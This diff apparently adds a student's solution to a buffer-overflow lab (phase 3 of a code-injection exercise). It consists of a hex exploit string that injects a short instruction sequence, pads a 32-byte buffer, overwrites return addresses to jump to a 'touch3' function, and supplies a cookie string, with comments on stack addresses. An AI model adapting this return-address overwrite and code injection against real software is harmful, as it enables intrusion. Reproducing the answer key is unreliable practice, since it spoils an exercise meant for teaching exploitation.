@@ -1,0 +1,14 @@
+48 C7 C7 B8 DC 61 55 C3  /*  mem address of exploit code  */
+FF FF FF FF FF FF FF FF  /*  32 byte buffer  */ 
+FF FF FF FF FF FF FF FF  /*  buffer  */
+FF FF FF FF FF FF FF FF  /*  buffer  */
+FF FF FF FF FF FF FF FF  /*  buffer  */
+78 DC 61 55 00 00 00 00  /*  mem address of $RSP  */ 
+78 DC 61 55 00 00 00 00  /*  loading $RSP twice to prevent segfault  */ 
+FA 18 40 00 00 00 00 00  /*  touch3 address  */
+35 39 62 39 39 37 66 61  /*  cookie string passed to touch3  */
+
+/*  converting cookie to string = 35 39 62 39 39 37 66 61  */
+/*  mem address of $RSP immediately after Gets() func = 0x5561dc78  */
+/*  mem address of $RSP in hexmatch() func = 0x5561dcb8  */
+
